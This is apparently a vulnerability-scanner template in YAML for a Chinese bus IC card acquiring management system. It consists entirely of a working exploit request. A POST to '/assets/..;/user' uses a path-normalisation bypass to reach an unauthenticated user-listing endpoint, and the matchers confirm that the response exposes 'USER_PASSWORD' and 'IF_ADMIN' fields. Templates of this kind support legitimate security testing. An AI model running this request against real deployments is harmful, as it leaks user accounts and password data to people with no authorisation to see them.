id: poc-yaml-bus-ic-user-info-leak
info:
  name: 公交IC卡收单管理系统 assets 信息泄露
  author: ProjectDiscoveryAI
  severity: medium
  tags: 信息泄露

http:
  - method: POST
    path:
      - "{{BaseURL}}/assets/..;/user"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      _search=false&nd=&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"USER_PASSWORD\""
      - type: word
        part: body
        words:
          - "\"IF_ADMIN\""
